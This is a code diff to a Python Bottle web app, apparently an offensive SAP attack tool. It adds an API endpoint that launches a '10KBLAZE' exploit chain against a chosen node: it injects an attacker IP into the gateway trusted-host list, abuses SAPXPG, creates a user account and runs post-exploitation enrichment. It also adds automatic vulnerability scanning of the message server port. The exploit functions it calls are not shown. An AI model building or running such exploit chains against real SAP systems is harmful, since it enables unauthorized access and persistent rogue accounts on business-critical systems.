@@ -1145,6 +1145,31 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_ms", "Check MS Betrusted", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/betrusted_chain", method="POST")
+    def node_betrusted_chain(sid):
+        """Full 10KBLAZE chain: betrusted → check GW trust → SAPXPG → create user."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        attacker_ip  = data.get("attacker_ip", "").strip()
+        nilist_wait  = float(data.get("nilist_wait", 30.0))
+
+        def _run():
+            created = sapmap_exploit.create_user_betrusted_chain(
+                node, api.state,
+                attacker_ip=attacker_ip,
+                nilist_wait=nilist_wait,
+            )
+            if created:
+                api.state.track_created_user(created)
+                sapmap_exploit._post_exploit_enrichment(node, api.state)
+
+        _bg(f"{sid}:betrusted_chain", "10KBLAZE Full Chain", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/betrusted", method="POST")
     def node_betrusted(sid):
         """Execute betrusted attack: inject attacker IP into gateway trusted host list."""
@@ -2515,6 +2540,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     print(f"[*] {sid}: RFC_SYSTEM_INFO returned no data")
             except Exception as e:
                 print(f"[*] {sid}: RFC_SYSTEM_INFO failed: {e}")
+
+            # Auto-check MS internal port for betrusted vulnerability
+            print(f"[*] {sid}: Checking MS internal port (CVE-2020-6207)...")
+            try:
+                sapmap_scanner.check_ms_betrusted(node)
+                if node.ms_vulnerable:
+                    print(f"[+] {sid}: MS port {node.ms_port} VULNERABLE "
+                          f"— betrusted attack possible (10KBLAZE)")
+                elif node.ms_port:
+                    print(f"[*] {sid}: MS port {node.ms_port} reachable "
+                          f"({'ACL-protected' if node.ms_acl_protected else 'open'})")
+            except Exception as e:
+                logger.debug(f"{sid}: MS check failed: {e}")
+
         threading.Thread(target=_enrich, daemon=True).start()
 
         return json.dumps({"status": "ok"})
